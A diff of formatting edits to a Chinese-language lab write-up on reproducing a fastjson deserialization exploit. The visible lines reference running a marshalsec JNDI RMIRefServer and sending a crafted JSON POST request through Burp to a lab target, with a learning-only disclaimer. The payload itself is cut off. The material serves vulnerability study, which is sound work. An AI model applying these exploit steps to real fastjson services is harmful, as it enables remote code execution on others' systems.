@@ -99,10 +99,10 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 3. 抓包触发 fastjson 请求
 访问 http://靶机:8090/ ，并通过bp抓包
 
-修改请求方式为 POST, Content-Type 改成application/json，并写入exp，然后发送请求。
+修改请求方式为 `POST`, `Content-Type 改成application/json`，并写入exp，然后发送请求。
 
 
-**payload:**
+### **payload:**
 
 ```
 {
@@ -229,4 +229,5 @@ Content-Length: 137
     ![](https://img-blog.csdnimg.cn/20200722205536663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)
 
 # 免责声明
+
 仅作为漏洞复现进行学习，切勿对网站进行非法测试
